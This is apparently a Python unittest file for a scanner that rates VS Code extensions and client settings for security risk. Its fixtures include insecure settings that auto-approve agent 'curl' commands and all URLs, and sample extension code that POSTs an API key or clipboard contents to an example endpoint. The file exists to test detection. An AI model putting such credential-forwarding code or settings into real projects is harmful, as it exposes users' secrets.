from __future__ import annotations

import hashlib
import json
import unittest
import zipfile
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from ide_scanner.benchmarks.adapters.protect_your_secrets import normalize_ground_truth_csv
from ide_scanner.benchmarks.runner import run_credential_exposure_benchmark, write_benchmark_bundle
from ide_scanner.discovery import discover_from_path
from ide_scanner.cli import _run_benchmark
from ide_scanner.posture import scan_posture, summarize_posture
from ide_scanner.registry import _marketplace_metadata_findings, _repository_metadata_findings
from ide_scanner.report_bundle import build_report_bundle, iter_report_events, write_report_bundle
from ide_scanner.sandbox_runner import run_sandbox
from ide_scanner.models import Finding
from ide_scanner.scanner import _classify_findings, _is_generated_code_blob, _marketplace_error_extension, _score_details, scan_extension, scan_targets


class ScannerTests(unittest.TestCase):
    def test_range_derived_advisory_is_context_until_version_is_resolved(self) -> None:
        finding = Finding(
            finding_id="range-advisory",
            extension_id="usernamehw.errorlens",
            version="3.28.0",
            rule_id="vulnerable-npm-dependency",
            category="dependency",
            severity="MEDIUM",
            confidence=0.7,
            score=50,
            evidence_type="registry",
            evidence_summary="A declared dependency range can include an affected version.",
            evidence={"evidence_class": "dependency", "exact": False, "package": "lodash", "version": "4.17.21"},
        )

        verdict, _reason, _authority, severity, malware, risk, _details = _classify_findings([finding])

        self.assertEqual(verdict, "clean")
        self.assertEqual(severity, "INFO")
        self.assertEqual(malware, 0)
        self.assertEqual(risk, 0)

    def test_marketplace_acquisition_failure_survives_coverage_finalization(self) -> None:
        failed = _marketplace_error_extension("publisher.large", "VSIX download exceeded the byte cap; aborted.")
        with patch("ide_scanner.scanner.scan_marketplace_extension", return_value=failed):
            report = scan_targets(marketplace_scan_ids=["publisher.large"])

        skipped = report["extensions"][0]["artifact_inventory"]["skipped_reason"]
        self.assertIn("VSIX download exceeded the byte cap", skipped)
        self.assertEqual(report["extensions"][0]["decision"], "incomplete")
        self.assertEqual(report["extensions"][0]["analysis_status"], "failed")

    def test_capability_reclassification_does_not_inflate_correlated_score(self) -> None:
        finding = Finding(
            finding_id="workspace-process",
            extension_id="dbaeumer.vscode-eslint",
            version="3.0.33",
            rule_id="untrusted-workspace-input-to-process",
            category="execution",
            severity="MEDIUM",
            confidence=0.8,
            score=50,
            evidence_type="static",
            evidence_summary="Workspace configuration reaches process execution.",
            evidence={"evidence_class": "capability"},
        )

        details = _score_details([finding])

        self.assertEqual(details["components"]["correlated_behavior"], 0)
        self.assertEqual(details["components"]["sensitive_capability"], 38)
        self.assertEqual(details["malware_score"], 0)
        self.assertEqual(details["risk_score"], 38)

    def test_posture_detects_risky_client_setup(self) -> None:
        with TemporaryDirectory() as tmp:
            home = Path(tmp)
            user = home / ".config" / "Code" / "User"
            user.mkdir(parents=True)
            (user / "settings.json").write_text(
                """
                {
                  "security.workspace.trust.enabled": false,
                  "task.allowAutomaticTasks": "on",
                  "chat.tools.global.autoApprove": true,
                  "chat.tools.terminal.ignoreDefaultAutoApproveRules": true,
                  "chat.tools.terminal.autoApprove": {"curl *": true},
                  "chat.tools.urls.autoApprove": {"*": true},
                  "extensions.supportUntrustedWorkspaces": {
                    "unknown.helper": {"supported": true}
                  }
                }
                """,
                encoding="utf-8",
            )
            extensions_root = home / ".vscode" / "extensions"
            extension = extensions_root / "unknown.helper-1.0.0"
            extension.mkdir(parents=True)
            (extension / "package.json").write_text(
                """
                {
                  "publisher": "unknown",
                  "name": "helper",
                  "version": "1.0.0",
                  "activationEvents": ["onStartupFinished"],
                  "contributes": {"languageModelTools": [{"name": "run"}]}
                }
                """,
                encoding="utf-8",
            )
            (extensions_root / "extensions.json").write_text(
                """
                [{
                  "identifier": {"id": "unknown.helper"},
                  "version": "1.0.0",
                  "relativeLocation": "unknown.helper-1.0.0",
                  "metadata": {"source": "vsix"}
                }]
                """,
                encoding="utf-8",
            )

            metrics = scan_posture(home)
            summary = summarize_posture(metrics)

        by_id = {metric.id: metric for metric in metrics}
        self.assertEqual(summary["status"], "failure")
        self.assertGreaterEqual(summary["score"], 70)
        self.assertEqual(by_id["workspace-trust"].status, "failure")
        self.assertEqual(by_id["agent-global-auto-approve"].status, "failure")
        self.assertEqual(by_id["terminal-auto-approve"].status, "failure")
        self.assertEqual(by_id["url-auto-approve"].status, "failure")
        self.assertEqual(by_id["extension-trust-overrides"].status, "failure")
        self.assertEqual(by_id["sideloaded-extensions"].status, "failure")
        self.assertEqual(by_id["extension-startup"].status, "warning")
        self.assertEqual(by_id["agentic-extensions"].status, "warning")

    def test_fixture_scan_classifies_extensions(self) -> None:
        report = scan_targets(include_fixtures=True)
        self.assertEqual(report["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
        self.assertIn("posture_summary", report)
        self.assertIn("posture_score", report["summary"])
        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}

        self.assertEqual(by_id["trusted.trusted-formatter"]["verdict"], "clean")
        self.assertEqual(by_id["trusted.startup-theme"]["verdict"], "clean")
        self.assertEqual(by_id["knownbad.feed-hit"]["verdict"], "clean")
        self.assertEqual(by_id["unknown.dropper"]["verdict"], "suspicious")
        self.assertEqual(by_id["example.mutable-dependency"]["verdict"], "clean")
        self.assertEqual(by_id["example.mutable-dependency"]["severity"], "LOW")
        self.assertEqual(by_id["example.native-artifact"]["verdict"], "review")

        suspicious = by_id["unknown.shadow-helper"]
        self.assertEqual(suspicious["verdict"], "suspicious")
        self.assertEqual(suspicious["severity"], "HIGH")
        self.assertEqual(suspicious["malware_score"], 0)
        self.assertGreater(suspicious["risk_score"], 0)
        self.assertIn("credential-exfiltration-chain", {finding["rule_id"] for finding in suspicious["findings"]})

        agent = by_id["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "clean")
        self.assertEqual(agent["malware_score"], 0)
        self.assertEqual(agent["risk_score"], 0)
        self.assertIn("agentic-tooling", {finding["rule_id"] for finding in agent["findings"]})

    def test_posture_can_be_disabled_for_hosted_package_scans(self) -> None:
        report = scan_targets(include_fixtures=True, include_posture=False)

        self.assertEqual(report["posture"], [])
        self.assertEqual(report["posture_summary"]["status"], "skipped")
        self.assertEqual(report["summary"]["posture_status"], "skipped")
        self.assertFalse(any("IDE/client posture" in item for item in report["human_summary"]))

    def test_report_bundle_splits_summary_leaderboard_and_details(self) -> None:
        report = scan_targets(include_fixtures=True)
        bundle = build_report_bundle(report, profile="smart", source="fixtures")

        self.assertEqual(bundle["metadata"]["schema_version"], "2.2")
        self.assertEqual(bundle["metadata"]["profile"], "smart")
        self.assertEqual(bundle["metadata"]["source"], "fixtures")
        self.assertEqual(bundle["metadata"]["policy_version"], "3.0.0-calibration.3")
        self.assertEqual(bundle["metadata"]["scanner_build"], report["scanner_build"])
        self.assertEqual(bundle["metadata"]["ruleset_version"], report["ruleset_version"])
        self.assertEqual(bundle["summary"]["summary"]["total_extensions"], len(discover_from_path(Path("fixtures"))))
        self.assertEqual(bundle["summary"]["summary"]["suspicious"], 2)
        self.assertIn("rules", bundle["rules"])

        rows = bundle["leaderboard"]["extensions"]
        self.assertEqual(len(rows), len(discover_from_path(Path("fixtures"))))
        self.assertTrue(all("detail_ref" in row for row in rows))
        suspicious = next(row for row in rows if row["extension_id"] == "unknown.shadow-helper")
        self.assertEqual(suspicious["grade"], "D")
        self.assertEqual(suspicious["decision"], "block")
        self.assertEqual(suspicious["coverage_percent"], 100)
        self.assertEqual(len(suspicious["artifact_sha256"]), 64)
        self.assertIn("credential-exfiltration-chain", suspicious["top_findings"])

        detail = bundle["extensions"][suspicious["detail_ref"]]
        raw = next(item for item in report["extensions"] if item["extension_id"] == "unknown.shadow-helper")
        for field in ("analysis_status", "decision", "severity", "risk_score", "malware_score"):
            self.assertEqual(detail[field], raw[field], msg=f"canonical field diverged: {field}")
        self.assertEqual(detail["artifact_identity"]["sha256"], raw["artifact_identity"]["sha256"])
        raw_findings = {item["finding_id"]: item for item in raw["findings"]}
        detail_findings = {item["finding_id"]: item for item in detail["findings"]}
        for finding_id in raw_findings.keys() & detail_findings.keys():
            for field in ("evidence_class", "actionability", "effective_severity"):
                self.assertEqual(detail_findings[finding_id][field], raw_findings[finding_id][field])
        self.assertEqual(detail["extension_id"], "unknown.shadow-helper")
        self.assertIn("score_explanation", detail)
        self.assertIn("recommendations", detail)
        self.assertTrue(detail["evidence"])
        self.assertTrue(detail["artifact_inventory"]["files"])
        self.assertIn("dependency_inventory", detail)
        self.assertEqual(
            set(detail["security_dimensions"]),
            {
                "behavior_safety",
                "supply_chain_integrity",
                "dependency_health",
                "artifact_integrity",
                "publisher_project_health",
                "analysis_confidence",
            },
        )
        self.assertIn("basis", detail["security_dimensions"]["behavior_safety"])
        self.assertIn("evidence_refs", detail["findings"][0])
        self.assertNotIn("evidence", detail["findings"][0])

    def test_legacy_report_keeps_legacy_policy_and_infers_completed_status(self) -> None:
        report = {
            "scan_id": "legacy-scan",
            "extensions": [{
                "extension_id": "example.legacy",
                "name": "legacy",
                "publisher": "example",
                "version": "1.0.0",
                "decision": "allow",
                "analysis_coverage": {"status": "complete", "coverage_percent": 100},
                "findings": [],
            }],
        }

        bundle = build_report_bundle(report)
        detail = next(iter(bundle["extensions"].values()))

        self.assertEqual(bundle["metadata"]["policy_version"], "legacy")
        self.assertEqual(bundle["metadata"]["ruleset_version"], "legacy")
        self.assertEqual(bundle["metadata"]["completed_extensions"], 1)
        self.assertEqual(bundle["metadata"]["incomplete_extensions"], 0)
        self.assertEqual(detail["analysis_status"], "complete")

    def test_contextual_findings_get_context_score_and_clean_with_notes_label(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"notes","version":"1.0.0"}',
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])
            bundle = build_report_bundle(report, profile="smart", source="folder")

        row = bundle["leaderboard"]["extensions"][0]
        detail = bundle["extensions"][row["detail_ref"]]
        self.assertEqual(row["verdict"], "clean")
        self.assertEqual(row["risk_score"], 0)
        self.assertGreater(row["context_score"], 0)
        self.assertEqual(row["verdict_state"], "safe_with_notes")
        self.assertEqual(row["verdict_label"], "Safe with notes")
        self.assertTrue(all(finding["actionability"] == "contextual" for finding in detail["findings"]))

    def test_configured_cli_execution_is_contextual_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"cli","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "const { execFile } = require('child_process');\n"
                "function run(){\n"
                " const cliPath = vscode.workspace.getConfiguration('tool').get('executablePath', 'tool');\n"
                " execFile(cliPath, ['analyze', vscode.window.activeTextEditor.document.uri.fsPath]);\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])
            bundle = build_report_bundle(report, profile="smart", source="folder")

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(scanned["risk_score"], 0)
        self.assertIn("process-execution", rule_ids)
        self.assertIn("safe-configured-cli-execution", rule_ids)
        row = bundle["leaderboard"]["extensions"][0]
        self.assertEqual(row["verdict_state"], "safe_with_notes")
        self.assertEqual(row["verdict_label"], "Safe with notes")
        self.assertGreater(row["context_score"], 0)

    def test_workspace_configured_cli_requires_untrusted_workspace_restriction(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = (
                "const vscode = require('vscode');\n"
                "const { execFile } = require('child_process');\n"
                "const cliPath = vscode.workspace.getConfiguration('tool').get('executablePath', 'tool');\n"
                "execFile(cliPath, ['analyze', filePath], { shell: false });\n"
            )

            unsafe = root / "unsafe"
            unsafe.mkdir()
            (unsafe / "package.json").write_text(json.dumps({
                "publisher": "example", "name": "unsafe-cli", "version": "1.0.0", "main": "extension.js",
                "contributes": {"configuration": {"properties": {
                    "tool.executablePath": {"type": "string", "default": "tool"}
                }}},
            }), encoding="utf-8")
            (unsafe / "extension.js").write_text(source, encoding="utf-8")

            safe = root / "safe"
            safe.mkdir()
            (safe / "package.json").write_text(json.dumps({
                "publisher": "example", "name": "safe-cli", "version": "1.0.0", "main": "extension.js",
                "capabilities": {"untrustedWorkspaces": {
                    "supported": True,
                    "restrictedConfigurations": ["tool.executablePath"],
                }},
                "contributes": {"configuration": {"properties": {
                    "tool.executablePath": {"type": "string", "default": "tool"}
                }}},
            }), encoding="utf-8")
            (safe / "extension.js").write_text(source, encoding="utf-8")

            unsafe_report = scan_extension(unsafe)
            safe_report = scan_extension(safe)

        self.assertEqual(unsafe_report.verdict, "review")
        self.assertIn("unrestricted-workspace-cli-path", {f.rule_id for f in unsafe_report.findings})
        self.assertEqual(safe_report.verdict, "clean")
        self.assertNotIn("unrestricted-workspace-cli-path", {f.rule_id for f in safe_report.findings})

    def test_regex_exec_and_workspace_tokens_do_not_create_execution_review(self) -> None:
        """RegExp.exec and ordinary editor metadata are not shell execution or a flow."""
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"regex","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const match = /token/.exec(vscode.window.activeTextEditor.document.fileName);\n"
                "const selected = vscode.window.activeTextEditor.selection;\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertNotIn("process-execution", rule_ids)
        self.assertNotIn("dynamic-shell-execution", rule_ids)
        self.assertNotIn("untrusted-input-execution", rule_ids)

    def test_explicit_child_process_exec_is_contextual_capability(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"shell","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "require('child_process').exec('tool --version');\n",
                encoding="utf-8",
            )

            report = scan_targets(paths=[root])

        scanned = report["extensions"][0]
        rule_ids = {finding["rule_id"] for finding in scanned["findings"]}
        self.assertEqual(scanned["verdict"], "clean")
        self.assertEqual(scanned["severity"], "INFO")
        self.assertIn("process-execution", rule_ids)
        self.assertIn("dynamic-shell-execution", rule_ids)

    def test_cross_extension_credential_exposure_findings(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "example",
                    "name": "credential-surfaces",
                    "version": "1.0.0",
                    "main": "extension.js",
                    "contributes": {
                        "configuration": {
                            "properties": {
                                "example.openaiApiKey": {
                                    "type": "string",
                                    "description": "OpenAI API key for requests",
                                }
                            }
                        },
                        "commands": [{
                            "command": "example.setApiToken",
                            "title": "Set API token",
                        }],
                    },
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "async function activate(context) {\n"
                " const key = await vscode.window.showInputBox({ prompt: 'Enter OpenAI API key' });\n"
                " await context.globalState.update('openaiApiKey', key);\n"
                " const clip = await vscode.env.clipboard.readText();\n"
                " await fetch('https://api.example.com/token', { method: 'POST', body: key || clip });\n"
                " vscode.commands.registerCommand('example.rotateApiToken', () => key);\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("credential-config-key", rule_ids)
        self.assertIn("credential-command-registration", rule_ids)
        self.assertIn("credential-inputbox-prompt", rule_ids)
        self.assertIn("credential-global-state-storage", rule_ids)
        self.assertIn("credential-input-near-state", rule_ids)
        self.assertIn("clipboard-near-credential-surface", rule_ids)
        self.assertIn("credential-source-near-network", rule_ids)
        self.assertEqual(report.verdict, "review")
        self.assertEqual(report.score_details["basis"], "cross_extension_exposure")
        self.assertGreaterEqual(report.risk_score, 50)

    def test_far_apart_credential_surfaces_do_not_create_control_chain(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"far-surfaces","version":"1.0.0","main":"extension.js"}',
                encoding="utf-8",
            )
            padding = "// unrelated implementation detail\n" * 200
            (root / "extension.js").write_text(
                "vscode.window.showInputBox({ prompt: 'Enter API token' });\n"
                + padding
                + "context.globalState.update('apiToken', 'documented default');\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("credential-input-near-state", rule_ids)

    def test_protect_your_secrets_csv_adapter_normalizes_labels(self) -> None:
        with TemporaryDirectory() as tmp:
            source = Path(tmp) / "Ground_Truth_datasets.csv"
            source.write_text(
                "\ufeffextensionID,install,type,is_vulnerable,data\n"
                "pub.secret,123,RequestedConfiguration,Credential,openai.apiKey\n"
                "pub.secret,123,InputBox,Credential,Enter API token\n"
                "pub.pii,5,GlobalState,PII,email\n"
                "pub.clean,9,Commands,Other,format document\n",
                encoding="utf-8",
            )

            dataset = normalize_ground_truth_csv(source)

        by_id = {item["extension_id"]: item for item in dataset["extensions"]}
        self.assertEqual(dataset["credential_data_points"], 2)
        self.assertEqual(dataset["credential_extension_count"], 1)
        self.assertEqual(by_id["pub.secret"]["label"], "credential_exposure")
        self.assertEqual(by_id["pub.secret"]["expected_findings"], ["credential-config-key", "credential-inputbox-prompt"])
        self.assertEqual(by_id["pub.pii"]["label"], "pii_exposure")
        self.assertEqual(by_id["pub.clean"]["label"], "non_credential")

    def test_credential_exposure_benchmark_runs_against_report_bundle(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp) / "extension"
            root.mkdir()
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "pub",
                    "name": "secret",
                    "version": "1.0.0",
                    "main": "extension.js",
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "const vscode = require('vscode');\n"
                "async function activate(context) {\n"
                " const token = await vscode.window.showInputBox({ prompt: 'Enter GitHub token' });\n"
                " await context.globalState.update('githubToken', token);\n"
                "}\n",
                encoding="utf-8",
            )
            dataset_path = Path(tmp) / "dataset.json"
            dataset_path.write_text(json.dumps({
                "dataset_id": "test-credential-exposure",
                "source": "unit-test",
                "extensions": [{
                    "extension_id": "pub.secret",
                    "version": "1.0.0",
                    "label": "credential_exposure",
                    "exposure_types": ["inputBox", "globalState"],
                    "expected_findings": ["credential-inputbox-prompt", "credential-global-state-storage"],
                    "reference": "unit-test",
                }],
            }), encoding="utf-8")
            report = scan_targets(paths=[root])
            report_zip = Path(tmp) / "report.zip"
            write_report_bundle(report, report_zip, profile="benchmark", source="folder")

            result = run_credential_exposure_benchmark(dataset_path, report_zip)
            benchmark_zip = Path(tmp) / "benchmark.zip"
            receipt = write_benchmark_bundle(result, benchmark_zip)

            with zipfile.ZipFile(benchmark_zip) as archive:
                names = set(archive.namelist())

        row = result["leaderboard"]["extensions"][0]
        self.assertEqual(row["outcome"], "true_positive")
        self.assertEqual(result["benchmark_summary"]["recall"], 1.0)
        self.assertEqual(result["benchmark_summary"]["precision"], 1.0)
        self.assertIn("credential-inputbox-prompt", row["matched_findings"])
        self.assertEqual(receipt["output"], str(benchmark_zip))
        self.assertIn("benchmark_summary.json", names)
        self.assertIn("rule_coverage.json", names)
        self.assertIn("extensions/pub.secret.json", names)

    def test_compiled_out_directory_is_scanned(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "out").mkdir()
            (root / "package.json").write_text(
                '{"publisher":"example","name":"compiled","version":"1.0.0","main":"./out/extension.js"}',
                encoding="utf-8",
            )
            (root / "out" / "extension.js").write_text(
                "const { execFile } = require('child_process'); execFile('tool', ['--version']);",
                encoding="utf-8",
            )

            report = scan_extension(root)

        self.assertIn("process-execution", {finding.rule_id for finding in report.findings})

    def test_write_report_bundle_creates_dashboard_ready_zip(self) -> None:
        with TemporaryDirectory() as tmp:
            report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
            output = Path(tmp) / "report.zip"
            receipt = write_report_bundle(report, output, profile="standard", source="folder")

            self.assertEqual(receipt["output"], str(output))
            with zipfile.ZipFile(output) as archive:
                names = set(archive.namelist())
                self.assertIn("metadata.json", names)
                self.assertIn("summary.json", names)
                self.assertIn("leaderboard.json", names)
                self.assertIn("posture.json", names)
                self.assertIn("rules.json", names)
                detail_names = [name for name in names if name.startswith("extensions/")]
                self.assertEqual(len(detail_names), 1)
                metadata = json.loads(archive.read("metadata.json"))
                leaderboard = json.loads(archive.read("leaderboard.json"))

        self.assertEqual(metadata["profile"], "standard")
        self.assertEqual(metadata["source"], "folder")
        self.assertEqual(leaderboard["extensions"][0]["detail_ref"], detail_names[0])

    def test_report_stream_events_include_summary_and_detail_refs(self) -> None:
        report = scan_targets(paths=[Path("fixtures") / "credential-exfil"])
        events = list(iter_report_events(report, profile="smart", source="folder", output="report.zip"))

        self.assertEqual(events[0]["type"], "scan_started")
        self.assertEqual(events[0]["total_extensions"], 1)
        self.assertIn("extension_summary_ready", {event["type"] for event in events})
        self.assertIn("extension_detail_ready", {event["type"] for event in events})
        self.assertEqual(events[-1]["type"], "scan_completed")
        self.assertEqual(events[-1]["output"], "report.zip")
        summary = next(event for event in events if event["type"] == "extension_summary_ready")
        self.assertEqual(summary["extension_id"], "unknown.shadow-helper")
        self.assertEqual(summary["verdict"], "suspicious")
        self.assertTrue(summary["detail_ref"].startswith("extensions/"))

    def test_path_discovery_finds_fixture_extensions(self) -> None:
        targets = discover_from_path(Path("fixtures"))
        paths = {Path(item["path"]).name for item in targets}
        self.assertTrue({
            "agent-tool", "benign-formatter", "credential-exfil", "lifecycle-dropper",
            "mutable-dependency", "native-artifact", "startup-theme", "threat-feed-malware",
        }.issubset(paths))

    def test_benchmark_uses_known_malicious_feed_fixture(self) -> None:
        result = _run_benchmark()
        by_id = {row["extension_id"]: row for row in result["rows"]}
        self.assertEqual(result["total"], 8)
        self.assertEqual(by_id["knownbad.feed-hit"]["expected_verdict"], "malicious")
        self.assertEqual(by_id["knownbad.feed-hit"]["actual_verdict"], "malicious")
        self.assertEqual(result["false_negative"], 0)

    def test_discovery_finds_vsix_files(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            vsix = root / "example.vsix"
            with zipfile.ZipFile(vsix, "w") as archive:
                archive.writestr("extension/package.json", '{"publisher":"example","name":"vsix","version":"1.0.0"}')

            targets = discover_from_path(root)

        self.assertEqual(targets, [{"type": "vsix", "path": str(vsix.resolve())}])

    def test_exact_registry_finding_moves_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "MEDIUM",
                "confidence": 0.58,
                "category": "dependency",
                "rule_id": "vulnerable-npm-dependency",
                "evidence_summary": "example@1.0.0 has 1 OSV finding(s). Version match: exact.",
                "evidence": {"package": "example", "version": "1.0.0", "exact": True, "osv_ids": ["GHSA-test"]},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        by_id = {extension["extension_id"]: extension for extension in report["extensions"]}
        formatter = by_id["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "review")
        self.assertEqual(formatter["severity"], "MEDIUM")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertGreater(formatter["risk_score"], 0)
        self.assertIn("vulnerable-npm-dependency", {finding["rule_id"] for finding in formatter["findings"]})

    def test_registry_intelligence_can_be_replayed_without_network_drift(self) -> None:
        registry = {
            "enabled": True,
            "mode": "batched",
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "HIGH",
                "confidence": 0.82,
                "category": "dependency",
                "rule_id": "vulnerable-npm-dependency",
                "evidence_summary": "example@1.0.0 has 1 OSV finding(s). Version match: exact.",
                "evidence": {"package": "example", "version": "1.0.0", "exact": True, "osv_ids": ["GHSA-test"]},
            }],
            "errors": [],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            live = scan_targets(include_fixtures=True, online=True)

        with TemporaryDirectory() as tmp:
            snapshot = Path(tmp) / "report.json"
            snapshot.write_text(json.dumps(live), encoding="utf-8")
            with patch("ide_scanner.scanner.enrich_registry", side_effect=AssertionError("network enrichment ran")):
                replay = scan_targets(include_fixtures=True, online=False, registry_snapshot_file=snapshot)

        live_by_id = {item["extension_id"]: item for item in live["extensions"]}
        replay_by_id = {item["extension_id"]: item for item in replay["extensions"]}
        self.assertEqual(
            (live_by_id["trusted.trusted-formatter"]["decision"], live_by_id["trusted.trusted-formatter"]["severity"]),
            (replay_by_id["trusted.trusted-formatter"]["decision"], replay_by_id["trusted.trusted-formatter"]["severity"]),
        )
        self.assertEqual(live["intelligence"]["registry"]["sha256"], replay["intelligence"]["registry"]["sha256"])
        self.assertEqual(replay["intelligence"]["registry"]["source"], "replay")

    def test_registry_snapshot_rejects_tampered_contents(self) -> None:
        with TemporaryDirectory() as tmp:
            snapshot = Path(tmp) / "registry.json"
            snapshot.write_text(json.dumps({
                "enabled": True,
                "mode": "batched",
                "findings": [],
                "errors": [],
                "snapshot": {"sha256": "0" * 64},
            }), encoding="utf-8")

            with self.assertRaisesRegex(ValueError, "digest does not match"):
                scan_targets(include_fixtures=True, registry_snapshot_file=snapshot)

    def test_registry_only_extension_id_can_be_marked_malicious(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "bad.bad-extension",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Malware.",
                "evidence": {"date": "1/1/2026", "type": "Malware"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["bad.bad-extension"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["source"], "registry-id")
        self.assertEqual(extension["verdict"], "malicious")
        self.assertEqual(extension["malware_authority"], "authoritative")
        self.assertEqual(extension["malware_score"], 100)
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "confirmed")

    def test_non_malware_marketplace_removal_is_not_authoritative_malware(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.impersonator",
                "severity": "HIGH",
                "confidence": 0.9,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Impersonation.",
                "evidence": {"date": "1/1/2026", "type": "Impersonation"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.impersonator"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "review")
        self.assertEqual(extension["malware_authority"], "none")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 80)
        self.assertEqual(extension["severity"], "HIGH")
        self.assertEqual(extension["score_details"]["basis"], "provenance")
        self.assertEqual(extension["findings"][0]["evidence"]["evidence_class"], "provenance")

    def test_suspicious_marketplace_removal_is_suspicious_not_authoritative(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "removed.suspicious",
                "severity": "CRITICAL",
                "confidence": 0.96,
                "category": "registry",
                "rule_id": "marketplace-removed-package",
                "evidence_summary": "Extension appears in Microsoft's removed package list as Suspicious.",
                "evidence": {"date": "1/1/2026", "type": "Suspicious"},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(extension_ids=["removed.suspicious"], online=True)

        extension = report["extensions"][0]
        self.assertEqual(extension["verdict"], "suspicious")
        self.assertEqual(extension["malware_authority"], "non_authoritative")
        self.assertEqual(extension["malware_score"], 0)
        self.assertGreaterEqual(extension["risk_score"], 88)

    def test_marketplace_reputation_only_does_not_move_clean_extension_to_review(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "trusted.trusted-formatter",
                "severity": "LOW",
                "confidence": 0.46,
                "category": "reputation",
                "rule_id": "marketplace-unverified-publisher",
                "evidence_summary": "Marketplace metadata does not report a verified publisher.",
                "evidence": {"publisher_verified": False, "install_count": 10},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        formatter = {extension["extension_id"]: extension for extension in report["extensions"]}["trusted.trusted-formatter"]
        self.assertEqual(formatter["verdict"], "clean")
        self.assertEqual(formatter["malware_score"], 0)
        self.assertEqual(formatter["risk_score"], 0)
        self.assertEqual(formatter["findings"][0]["evidence"]["evidence_class"], "reputation")
        self.assertEqual(formatter["score_details"]["components"]["reputation"], 8)

    def test_verified_publisher_is_reported_as_suppressor_only(self) -> None:
        registry = {
            "enabled": True,
            "findings": [{
                "extension_id": "example.agent-toolbox",
                "severity": "INFO",
                "confidence": 0.95,
                "category": "reputation",
                "rule_id": "marketplace-verified-publisher",
                "evidence_summary": "Marketplace metadata reports a verified publisher.",
                "evidence": {"publisher_verified": True, "install_count": 100000},
            }],
        }
        with patch("ide_scanner.scanner.enrich_registry", return_value=registry):
            report = scan_targets(include_fixtures=True, online=True)

        agent = {extension["extension_id"]: extension for extension in report["extensions"]}["example.agent-toolbox"]
        self.assertEqual(agent["verdict"], "clean")
        self.assertEqual(agent["malware_score"], 0)
        self.assertIn("verified-publisher", {item["id"] for item in agent["score_details"]["suppressors"]})

    def test_marketplace_metadata_findings_are_contextual(self) -> None:
        findings = _marketplace_metadata_findings("example.low", {
            "extension_id": "example.low",
            "found": True,
            "publisher_verified": False,
            "install_count": 5,
            "rating_average": 2.0,
            "rating_count": 8,
            "last_updated": "2020-01-01T00:00:00Z",
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("marketplace-unverified-publisher", rule_ids)
        self.assertIn("marketplace-low-install-count", rule_ids)
